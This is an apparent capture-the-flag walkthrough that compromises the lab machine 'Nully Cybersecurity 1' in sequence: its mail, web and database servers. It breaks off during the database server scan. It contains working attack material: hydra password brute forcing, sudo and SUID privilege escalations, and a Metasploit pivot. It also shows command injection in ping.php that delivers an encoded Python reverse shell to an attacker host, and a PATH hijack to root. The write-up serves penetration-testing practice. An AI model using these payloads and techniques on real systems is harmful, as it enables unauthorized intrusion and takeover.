
# Nully Cybersecurity 1 - CTF

Available on VulnHub: https://www.vulnhub.com/entry/nully-cybersecurity-1,549/


## Walkthrough

### IP Discovery

```
$ sudo netdiscover -r 192.168.1.0/16
```

```
Currently scanning: Finished!   |   Screen View: Unique Hosts

0 Captured ARP Req/Rep packets, from 0 hosts.   Total size: 0
_____________________________________________________________________________
 IP            At MAC Address     Count     Len  MAC Vendor / Hostname
-----------------------------------------------------------------------------
xxx.xxx.x.x     xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
192.168.1.108   08:00:27:81:28:c4      1      60  PCS Systemtechnik GmbH
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

### Port Scanning

```
$ nmap -AT4 -p- 192.168.1.108
```

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-15 10:53 -03
Nmap scan report for 192.168.1.108
Host is up (0.00020s latency).
Not shown: 65530 closed ports
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome to the Nully Cybersecurity CTF
110/tcp  open  pop3        Dovecot pop3d
|_pop3-capabilities: TOP AUTH-RESP-CODE SASL(PLAIN LOGIN) RESP-CODES CAPA USER PIPELINING UIDL
2222/tcp open  ssh         OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 8d:c1:b0:f5:0a:3d:1c:32:80:91:14:c5:3b:04:e1:3e (RSA)
|   256 cb:22:f4:e3:e1:f1:61:68:58:91:9a:96:19:35:2c:ff (ECDSA)
|_  256 a5:e3:48:57:49:55:85:f9:8c:9a:c1:8c:a6:49:f5:2d (ED25519)
8000/tcp open  nagios-nsca Nagios NSCA
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
9000/tcp open  cslistener?
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Accept-Ranges: bytes
|     Cache-Control: max-age=31536000
|     Content-Length: 23203
|     Content-Type: text/html; charset=utf-8
|     Last-Modified: Wed, 22 Jul 2020 22:47:36 GMT
|     X-Content-Type-Options: nosniff
|     X-Xss-Protection: 1; mode=block
|     Date: Mon, 15 Feb 2021 13:53:26 GMT
|     <!DOCTYPE html
|     ><html lang="en" ng-app="portainer">
|     <head>
|     <meta charset="utf-8" />
|     <title>Portainer</title>
|     <meta name="description" content="" />
|     <meta name="author" content="Portainer.io" />
|     <!-- HTML5 shim, for IE6-8 support of HTML5 elements -->
|     <!--[if lt IE 9]>
|     <script src="//html5shim.googlecode.com/svn/trunk/html5.js"></script>
|     <![endif]-->
|     <!-- Fav and touch icons -->
|     <link rel="apple-touch-icon" sizes="180x180" href="dc4d092847be46242d8c013d1bc7c494.png" />
|_    <link rel="icon" type="image/png" sizes="32x32" href="5ba13dcb526292ae707310a54e103cd1.png"
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9000-TCP:V=7.91%I=7%D=2/15%Time=602A7CD5%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
SF:20Request")%r(GetRequest,5BC1,"HTTP/1\.0\x20200\x20OK\r\nAccept-Ranges:
SF:\x20bytes\r\nCache-Control:\x20max-age=31536000\r\nContent-Length:\x202
SF:3203\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nLast-Modified:\
SF:x20Wed,\x2022\x20Jul\x202020\x2022:47:36\x20GMT\r\nX-Content-Type-Optio
SF:ns:\x20nosniff\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x20Mon
SF:,\x2015\x20Feb\x202021\x2013:53:26\x20GMT\r\n\r\n<!DOCTYPE\x20html\n><h
SF:tml\x20lang=\"en\"\x20ng-app=\"portainer\">\n\x20\x20<head>\n\x20\x20\x
SF:20\x20<meta\x20charset=\"utf-8\"\x20/>\n\x20\x20\x20\x20<title>Portaine
SF:r</title>\n\x20\x20\x20\x20<meta\x20name=\"description\"\x20content=\"\
SF:"\x20/>\n\x20\x20\x20\x20<meta\x20name=\"author\"\x20content=\"Portaine
SF:r\.io\"\x20/>\n\n\x20\x20\x20\x20<!--\x20HTML5\x20shim,\x20for\x20IE6-8
SF:\x20support\x20of\x20HTML5\x20elements\x20-->\n\x20\x20\x20\x20<!--\[if
SF:\x20lt\x20IE\x209\]>\n\x20\x20\x20\x20\x20\x20<script\x20src=\"//html5s
SF:him\.googlecode\.com/svn/trunk/html5\.js\"></script>\n\x20\x20\x20\x20<
SF:!\[endif\]-->\n\n\x20\x20\x20\x20<!--\x20Fav\x20and\x20touch\x20icons\x
SF:20-->\n\x20\x20\x20\x20<link\x20rel=\"apple-touch-icon\"\x20sizes=\"180
SF:x180\"\x20href=\"dc4d092847be46242d8c013d1bc7c494\.png\"\x20/>\n\x20\x2
SF:0\x20\x20<link\x20rel=\"icon\"\x20type=\"image/png\"\x20sizes=\"32x32\"
SF:\x20href=\"5ba13dcb526292ae707310a54e103cd1\.png\"")%r(HTTPOptions,3406
SF:,"HTTP/1\.0\x20200\x20OK\r\nAccept-Ranges:\x20bytes\r\nCache-Control:\x
SF:20max-age=31536000\r\nContent-Length:\x2023203\r\nContent-Type:\x20text
SF:/html;\x20charset=utf-8\r\nLast-Modified:\x20Wed,\x2022\x20Jul\x202020\
SF:x2022:47:36\x20GMT\r\nX-Content-Type-Options:\x20nosniff\r\nX-Xss-Prote
SF:ction:\x201;\x20mode=block\r\nDate:\x20Mon,\x2015\x20Feb\x202021\x2013:
SF:53:26\x20GMT\r\n\r\n<!DOCTYPE\x20html\n><html\x20lang=\"en\"\x20ng-app=
SF:\"portainer\">\n\x20\x20<head>\n\x20\x20\x20\x20<meta\x20charset=\"utf-
SF:8\"\x20/>\n\x20\x20\x20\x20<title>Portainer</title>\n\x20\x20\x20\x20<m
SF:eta\x20name=\"description\"\x20content=\"\"\x20/>\n\x20\x20\x20\x20<met
SF:a\x20name=\"author\"\x20content=\"Portainer\.io\"\x20/>\n\n\x20\x20\x20
SF:\x20<!--\x20HTML5\x20shim,\x20for\x20IE6-8\x20support\x20of\x20HTML5\x2
SF:0elements\x20-->\n\x20\x20\x20\x20<!--\[if\x20lt\x20IE\x209\]>\n\x20\x2
SF:0\x20\x20\x20\x20<script\x20src=\"//html5shim\.googlecode\.com/svn/trun
SF:k/html5\.js\"></script>\n\x20\x20\x20\x20<!\[endif\]-->\n\n\x20\x20\x20
SF:\x20<!--\x20Fav\x20and\x20touch\x20icons\x20-->\n\x20\x20\x20\x20<link\
SF:x20rel=\"apple-touch-icon\"\x20sizes=\"180x180\"\x20href=\"dc4d092847be
SF:46242d8c013d1bc7c494\.png\"\x20/>\n\x20\x20\x20\x20<link\x20rel=\"icon\
SF:"\x20type=\"image/png\"\x20sizes=\"32x32\"\x20href=\"5ba13dcb526292ae70
SF:7310a54e103cd1\.png\"");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 90.05 seconds
```

### Scope / Rules

* 3 Flags: MailServer, WebServer, DatabaseServer
* Dont attack this port 80, 8000 and 9000 ports
* Dont user kernel exploits
* Dont bruteforce root passwords
* Hint: 'cat rockyou.txt | grep bobby > wordlist' for generating wordlist.
* To start, check your email on port 110 with authorization data pentester:qKnGByeaeQJWTjj2efHxst7Hu0xHADGO

### Checking Email

User: **pentester**\
Pass: **qKnGByeaeQJWTjj2efHxst7Hu0xHADGO**
```
$ nc 192.168.1.108 pop3

+OK Dovecot (Ubuntu) ready.
USER pentester
+OK
PASS qKnGByeaeQJWTjj2efHxst7Hu0xHADGO
+OK Logged in.

LIST
+OK 1 messages:
1 657
.

RETR 1
+OK 657 octets
Return-Path: <root@MailServer>
X-Original-To: pentester@localhost
Delivered-To: pentester@localhost
Received: by MailServer (Postfix, from userid 0)
	id 20AE4A4C29; Tue, 25 Aug 2020 17:04:49 +0300 (+03)
Subject: About server
To: <pentester@localhost>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20200825140450.20AE4A4C29@MailServer>
Date: Tue, 25 Aug 2020 17:04:49 +0300 (+03)
From: root <root@MailServer>

Hello,
I'm Bob Smith, the Nully Cybersecurity mail server administrator.
The boss has already informed me about you and that you need help accessing the server.
Sorry, I forgot my password, but I remember the password was simple.
```

### Mail Server Brute Force

```
$ hydra -l bob -P nully_wordlist.txt 192.168.1.108 -vV -f pop3

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-02-15 13:24:44
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 2453 login tries (l:1/p:2453), ~154 tries per task
[DATA] attacking pop3://192.168.1.108:110/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[VERBOSE] CAPABILITY: +OK
CAPA
TOP
UIDL
RESP-CODES
PIPELINING
AUTH-RESP-CODE
USER
SASL PLAIN LOGIN
.
[VERBOSE] using POP3 LOGIN AUTH mechanism
[ATTEMPT] target 192.168.1.108 - login "bob" - pass "bobby" - 1 of 2453 [child 0] (0/0)
[ATTEMPT] target 192.168.1.108 - login "bob" - pass "bobby1" - 2 of 2453 [child 1] (0/0)
[ATTEMPT] target 192.168.1.108 - login "bob" - pass "bobby123" - 3 of 2453 [child 2] (0/0)
.
..
...
..
.
[ATTEMPT] target 192.168.1.108 - login "bob" - pass "bobby1985" - 527 of 2453 [child 14] (0/0)
[110][pop3] host: 192.168.1.108   login: bob   password: bobby1985
[STATUS] attack finished for 192.168.1.108 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-02-15 13:34:54
```

Credentials:
* User: **bob**
* Pass: **bobby1985**

### SSH Access

```
$ ssh bob@192.168.1.108 -p 2222
bob@192.168.1.108's password: bobby1985

Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Thu Aug 27 16:14:40 2020 from 172.17.0.1

bob@MailServer:~$ id
uid=1000(bob) gid=1000(bob) groups=1000(bob)
```

### Privilege Escalation - my2user

Bob user's is allowed to run `/bin/bash /opt/scripts/check.sh` as `my2user` without password
```
bob@MailServer:~$ sudo -l
Matching Defaults entries for bob on MailServer:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bob may run the following commands on MailServer:
    (my2user) NOPASSWD: /bin/bash /opt/scripts/check.sh
```

First of all, I added a `/bin/bash` command in `/opt/scripts/check.sh` script.
```
my2user@MailServer:~$ head /opt/scripts/check.sh

#!/bin/bash
echo "This is script for check security on the server by laf3r"
echo "Script runned as $USER"
/bin/bash
...
..
.
```

Now is just run the script as `my2user`
```
bob@MailServer:~$ sudo -u my2user /bin/bash /opt/scripts/check.sh

sudo: setrlimit(RLIMIT_CORE): Operation not permitted
This is script for check security on the server by laf3r
Script runned as my2user

my2user@MailServer:~$ id
uid=1001(my2user) gid=1001(my2user) groups=1001(my2user)
```

### Privilege Escalation - Root

`my2user` is allowed to run `/usr/bin/zip` command as root without password
```
my2user@MailServer:~$ sudo -l
Matching Defaults entries for my2user on MailServer:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User my2user may run the following commands on MailServer:
    (root) NOPASSWD: /usr/bin/zip
```

Using zip privilege escalation
```
my2user@MailServer:~$ touch zip_priv_esc.txt

my2user@MailServer:~$ sudo /usr/bin/zip zip_priv_esc.zip zip_priv_esc.txt -T --unzip-command="sh -c /bin/bash"
  adding: zip_priv_esc.txt (stored 0%)

root@MailServer:/home/my2user# id
uid=0(root) gid=0(root) groups=0(root)
```

### Flag #1 - Mail Server

```
root@MailServer:~# cat 1_flag.txt 

       .88888.                          dP           dP          dP       
      d8'   `88                         88           88          88       
      88        .d8888b. .d8888b. .d888b88           88 .d8888b. 88d888b. 
      88   YP88 88'  `88 88'  `88 88'  `88           88 88'  `88 88'  `88 
      Y8.   .88 88.  .88 88.  .88 88.  .88    88.  .d8P 88.  .88 88.  .88 
       `88888'  `88888P' `88888P' `88888P8     `Y8888'  `88888P' 88Y8888' 
      oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo
                                                                          
	Mail server is rooted.
	You got the first flag: 2c393307906f29ee7fb69e2ce59b4c8a
	Now go to the web server and root it.
```

### Internal Network Scan

```
root@MailServer:~# nmap -sV 172.17.0.0/24 > nmap_net.txt
```

We found 5 nodes in internal network
```
root@MailServer:~# cat nmap_net.txt | grep "Nmap scan report for"

Nmap scan report for 172.17.0.1
Nmap scan report for MailServer (172.17.0.2)
Nmap scan report for 172.17.0.3
Nmap scan report for 172.17.0.4
Nmap scan report for 172.17.0.5
```

Analysing NMAP report, we can discover that `172.17.0.4` is the WebServer because it is hosting a web server on port 80.
```
Nmap scan report for 172.17.0.4
Host is up (0.0000080s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
MAC Address: 02:42:AC:11:00:04 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Pivoting to WebServer

Creating a shell session with MailServer through SSH login
```
msf6 > use auxiliary/scanner/ssh/ssh_login

msf6 auxiliary(scanner/ssh/ssh_login) > set PASSWORD bobby1985
msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS 192.168.1.108
msf6 auxiliary(scanner/ssh/ssh_login) > set RPORT 2222
msf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME bob

msf6 auxiliary(scanner/ssh/ssh_login) > show options

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   PASSWORD          bobby1985        no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   RHOSTS            192.168.1.108    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT             2222             yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads (max one per host)
   USERNAME          bob              no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           false            yes       Whether to print output for all attempts

msf6 auxiliary(scanner/ssh/ssh_login) > exploit

[+] 192.168.1.108:2222 - Success: 'bob:bobby1985' 'uid=1000(bob) gid=1000(bob) groups=1000(bob) Linux MailServer 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux '
[*] Command shell session 1 opened (192.168.1.189:33363 -> 192.168.1.108:2222) at 2021-02-15 14:26:52 -0300
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

msf6 auxiliary(scanner/ssh/ssh_login) > sessions

Active sessions
===============

  Id  Name  Type         Information                             Connection
  --  ----  ----         -----------                             ----------
  1         shell linux  SSH bob:bobby1985 (192.168.1.108:2222)  192.168.1.189:33363 -> 192.168.1.108:2222 (192.168.1.108)
```

Upgrading shell session to meterpreter session
```
msf6 auxiliary(scanner/ssh/ssh_login) > sessions -u 1

[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]
[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.168.1.189:4433 
[*] Sending stage (980808 bytes) to 192.168.1.108
[*] Meterpreter session 2 opened (192.168.1.189:4433 -> 192.168.1.108:36970) at 2021-02-15 14:28:57 -0300
[*] Command stager progress: 100.00% (773/773 bytes)

msf6 auxiliary(scanner/ssh/ssh_login) > sessions

Active sessions
===============

  Id  Name  Type                   Information                                                               Connection
  --  ----  ----                   -----------                                                               ----------
  1         shell linux            SSH bob:bobby1985 (192.168.1.108:2222)                                    192.168.1.189:33363 -> 192.168.1.108:2222 (192.168.1.108)
  2         meterpreter x86/linux  bob @ MailServer (uid=1000, gid=1000, euid=1000, egid=1000) @ 172.17.0.2  192.168.1.189:4433 -> 192.168.1.108:36970 (172.17.0.2)
```

Routing networks
```
msf6 auxiliary(scanner/ssh/ssh_login) > sessions 2
[*] Starting interaction with 2...

meterpreter > run autoroute -s 172.17.0.1/24

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 172.17.0.1/255.255.255.0...
[+] Added route to 172.17.0.1/255.255.255.0 via 192.168.1.108
[*] Use the -p option to list all active routes

meterpreter > run autoroute -p

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]

Active Routing Table
====================

   Subnet             Netmask            Gateway
   ------             -------            -------
   172.17.0.1         255.255.255.0      Session 2
```

Port forwarding
```
meterpreter > portfwd add -l 8181 -p 80 -r 172.17.0.4
[*] Local TCP relay created: :8181 <-> 172.17.0.4:80
```

Now we are able to access the internal Web Server hosted at 172.17.0.4 using our localhost over 8181 port.

### Web Analysis

```
$ dirb http://localhost:8181

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Mon Feb 15 14:43:05 2021
URL_BASE: http://localhost:8181/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://localhost:8181/ ----
+ http://localhost:8181/index.html (CODE:200|SIZE:209)                                                                              
==> DIRECTORY: http://localhost:8181/ping/                                                                                          
+ http://localhost:8181/robots.txt (CODE:200|SIZE:6)                                                                                
+ http://localhost:8181/server-status (CODE:403|SIZE:276)
```

### /ping Directory

[ GET ] http://localhost:8181/ping/For-Oscar.txt
```
This web application uses the ping utility to check other servers. I think this is more convenient than writing ping in the console every time, so I'll leave this one here. -Oliver
```

[ GET ] http://localhost:8181/ping/ping.php
```
Use the host parameter<pre>Array ( ) </pre>
```

Using host as parameter, we are able to ping the internal hosts.\
[ GET ] http://localhost:8181/ping/ping.php?host=172.17.0.2
```
Use the host parameter<pre>Array ( [0] => PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data. [1] => 64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.022 ms [2] => 64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.048 ms [3] => 64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.040 ms [4] => 64 bytes from 172.17.0.2: icmp_seq=4 ttl=64 time=0.041 ms [5] => [6] => --- 172.17.0.2 ping statistics --- [7] => 4 packets transmitted, 4 received, 0% packet loss, time 3050ms [8] => rtt min/avg/max/mdev = 0.022/0.037/0.048/0.009 ms ) </pre>
```

This mechanism is a high probable RCE (Remote Coding Exection) attack surface.

### Validating RCE Vulnerability

[ GET ] http://localhost:8181/ping/ping.php?host=172.17.0.2;id
```
Use the host parameter<pre>Array ( [0] => PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data. [1] => 64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.025 ms [2] => 64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.042 ms [3] => 64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.045 ms [4] => 64 bytes from 172.17.0.2: icmp_seq=4 ttl=64 time=0.043 ms [5] => [6] => --- 172.17.0.2 ping statistics --- [7] => 4 packets transmitted, 4 received, 0% packet loss, time 3050ms [8] => rtt min/avg/max/mdev = 0.025/0.038/0.045/0.008 ms [9] => uid=33(www-data) gid=33(www-data) groups=33(www-data) ) </pre>
```

RCE: [ GET ] http://localhost:8181/ping/ping.php?host=172.17.0.2;{command}

### Reverse Shell

Generating payload.\
**Note**: msfvenom will generate a **python** payload, but we need to use **python3** instead of **python**.
```
$ msfvenom -p cmd/unix/reverse_python LHOST=192.168.1.189 LPORT=4545 -f raw

[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder specified, outputting raw payload
Payload size: 565 bytes

python -c "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCAgICAsICAgc3VicHJvY2VzcyAgICAsICAgb3MgOyAgICAgICAgaG9zdD0iMTkyLjE2OC4xLjE4OSIgOyAgICAgICAgcG9ydD00NTQ1IDsgICAgICAgIHM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCAgICAsICAgc29ja2V0LlNPQ0tfU1RSRUFNKSA7ICAgICAgICBzLmNvbm5lY3QoKGhvc3QgICAgLCAgIHBvcnQpKSA7ICAgICAgICBvcy5kdXAyKHMuZmlsZW5vKCkgICAgLCAgIDApIDsgICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAsICAgMSkgOyAgICAgICAgb3MuZHVwMihzLmZpbGVubygpICAgICwgICAyKSA7ICAgICAgICBwPXN1YnByb2Nlc3MuY2FsbCgiL2Jpbi9iYXNoIik=')[0]))"
```

Listen connection in host:
```
$ nc -lvp 4545
listening on [any] 4545 ...
```

Running payload through RCE vulnerability
```
[ GET ] http://localhost:8181/ping/ping.php?host=172.17.0.2;python3%20-c%20%22exec(__import__(%27base64%27).b64decode(__import__(%27codecs%27).getencoder(%27utf-8%27)(%27aW1wb3J0IHNvY2tldCAgICAsICAgc3VicHJvY2VzcyAgICAsICAgb3MgOyAgICAgICAgaG9zdD0iMTkyLjE2OC4xLjE4OSIgOyAgICAgICAgcG9ydD00NTQ1IDsgICAgICAgIHM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCAgICAsICAgc29ja2V0LlNPQ0tfU1RSRUFNKSA7ICAgICAgICBzLmNvbm5lY3QoKGhvc3QgICAgLCAgIHBvcnQpKSA7ICAgICAgICBvcy5kdXAyKHMuZmlsZW5vKCkgICAgLCAgIDApIDsgICAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICAsICAgMSkgOyAgICAgICAgb3MuZHVwMihzLmZpbGVubygpICAgICwgICAyKSA7ICAgICAgICBwPXN1YnByb2Nlc3MuY2FsbCgiL2Jpbi9iYXNoIik=%27)[0]))%22
```

Reverse connection:
```
listening on [any] 4545 ...
connect to [192.168.1.189] from (UNKNOWN) [192.168.1.108] 49922

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Privilege Escalation - oscar

```
$ find / -type f -perm -u=s 2>/dev/null

/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/su
/usr/bin/mount
/usr/bin/chfn
/usr/bin/umount
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/python3
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
```

Apparently, `/usr/bin/python3` can be executed as `oscar` user and it has SUID.
```
ls -lah /usr/bin | grep python3

-rwsr-xr-x 1 oscar oscar   5.3M Aug 26 14:19 python3
-rwxr-xr-x 1 oscar oscar   5.3M Mar 13  2020 python3.8
```

Using GTFObins for python SUID ( https://gtfobins.github.io/gtfobins/python/#suid )\
Now we are able to access `oscar` user files.
```
$ /usr/bin/python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

$ cd /home/oscar
$ ls -lah
total 36K
drwx------ 4 oscar oscar 4.0K Aug 26 14:25 .
drwxr-xr-x 1 root  root  4.0K Aug 26 13:38 ..
-rw------- 1 oscar oscar    0 Feb 15 14:48 .bash_history
-rw-r--r-- 1 oscar oscar  220 Aug 25 16:11 .bash_logout
-rw-r--r-- 1 oscar oscar 3.7K Aug 25 16:11 .bashrc
drwx------ 2 oscar oscar 4.0K Aug 25 20:09 .cache
-rw-r--r-- 1 oscar oscar  807 Aug 25 16:11 .profile
-rw------- 1 oscar oscar 2.2K Aug 26 14:25 .viminfo
-r-------- 1 oscar oscar   37 Aug 26 14:25 my_password
drwx------ 2 oscar oscar 4.0K Aug 27 15:02 scripts
```

`oscar` has a file called `my_password` in his home directory
```
$ cat my_password
H53QfJcXNcur9xFGND3bkPlVlMYUrPyBp76o

$ su oscar
Password: H53QfJcXNcur9xFGND3bkPlVlMYUrPyBp76o

python3 -c 'import pty;pty.spawn("/bin/bash")'

oscar@WebServer:~$ id
uid=1000(oscar) gid=1000(oscar) groups=1000(oscar)
```

### Privilege Escalation - Root

In `oscar` user's home we can find a script called `current-date` that apparently run as root.
```
oscar@WebServer:~/scripts$ ls -lah
total 28K
drwx------ 2 oscar oscar 4.0K Feb 15 19:43 .
drwx------ 4 oscar oscar 4.0K Aug 26 14:25 ..
-rwsr-xr-x 1 root  root   17K Aug 26 14:14 current-date
```

The script calls linux `date` command
```
oscar@WebServer:~/scripts$ ./current-date
Mon Feb 15 21:55:14 CET 2021

oscar@WebServer:~/scripts$ date
Mon Feb 15 21:55:18 CET 2021
```

The idea is to redirect relative date command.\
The date binary is comming from `/usr/bin`.\
We are able to redirect it editing the `PATH` environment to a modified `date` binary or script.
```
oscar@WebServer:~/scripts$ whereis date
date: /usr/bin/date

oscar@WebServer:~/scripts$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
```

Creating a date script in `/tmp` directory with bash spawn command.
```
oscar@WebServer:/tmp$ echo "/bin/bash" > date
oscar@WebServer:/tmp$ chmod +x date
```

Now we need to add `/tmp` directory in `PATH` environment variable.\
It is important that it keep before the original `date` binary from `/usr/bin`.\
So we just have to add `/tmp` folder in the start of `PATH`.
```
oscar@WebServer:/tmp$ export PATH=/tmp:$PATH
```

So when current-date run, the `date` that will be executed will be our script.
```
oscar@WebServer:~/scripts$ ./current-date

root@WebServer:~/scripts# id
uid=0(root) gid=0(root) groups=0(root),1000(oscar)
```

### Flag #2 - Web Server

```
root@WebServer:/root# cat 2_flag.txt
 __          __  _ _       _                  
 \ \        / / | | |     | |                 
  \ \  /\  / /__| | |   __| | ___  _ __   ___ 
   \ \/  \/ / _ \ | |  / _` |/ _ \| '_ \ / _ \
    \  /\  /  __/ | | | (_| | (_) | | | |  __/
     \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___|
                                              
                                             
Well done! You second flag: 7afc7a60ac389f8d5c6f8f7d0ec645da
Now go to the Database server.
```

### Port Scanning - DatabaseServer

Detalied port scanning
```
root@WebServer:~# nmap -AT4 -p- 172.17.0.3

Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-16 01:15 +03
Nmap scan report for 172.17.0.3
Host is up (0.000061s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    3 ftp      ftp          4096 Aug 27 08:35 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:172.17.0.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
MAC Address: 02:42:AC:11:00:03 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=2/16%OT=21%CT=1%CU=38203%PV=Y%DS=1%DC=D%G=Y%M=0242AC%T
OS:M=602AF278%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10A%TI=Z%CI=Z%II=I
